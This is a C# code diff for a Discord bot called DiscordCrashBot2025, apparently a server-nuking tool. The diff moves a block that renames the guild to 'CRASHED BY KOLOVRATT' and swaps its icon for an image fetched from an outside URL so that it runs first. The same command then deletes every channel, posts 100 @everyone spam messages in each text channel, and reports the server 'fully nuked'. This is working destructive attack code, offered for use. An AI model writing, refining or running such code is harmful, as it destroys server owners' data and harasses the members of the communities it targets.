@@ -123,6 +123,21 @@ namespace DiscordCrashBot2025
         {
             await DeferAsync(ephemeral: true);
 
+            using (var http = new HttpClient())
+            {
+                var avatarUrl = "https://i.postimg.cc/QdMVSnqM/9cdd99f377e5882ee1c5b394395611cf.jpg";
+                var avatarBytes = await http.GetByteArrayAsync(avatarUrl);
+
+                using (var stream = new MemoryStream(avatarBytes))
+                {
+                    await Context.Guild.ModifyAsync(g =>
+                    {
+                        g.Name = "CRASHED BY KOLOVRATT";
+                        g.Icon = new Image(stream);  
+                    });
+                }
+            }
+
             var channels = Context.Guild.Channels.ToList();
             await Task.WhenAll(channels.Select(c => c.DeleteAsync()));
 
@@ -148,21 +163,6 @@ namespace DiscordCrashBot2025
             var spamTasks = textChannels.SelectMany(c =>
                 Enumerable.Range(0, 100).Select(_ => c.SendMessageAsync("@everyone SERVER CRASHED BY KOLOVRATT")));
             await Task.WhenAll(spamTasks);
-
-            using (var http = new HttpClient())
-            {
-                var avatarUrl = "https://i.postimg.cc/QdMVSnqM/9cdd99f377e5882ee1c5b394395611cf.jpg";
-                var avatarBytes = await http.GetByteArrayAsync(avatarUrl);
-
-                using (var stream = new MemoryStream(avatarBytes))
-                {
-                    await Context.Guild.ModifyAsync(g =>
-                    {
-                        g.Name = "CRASHED BY KOLOVRATT";
-                        g.Icon = new Image(stream);  
-                    });
-                }
-            }
 
             await FollowupAsync("☢️ Server fully nuked and rebranded!");
         }
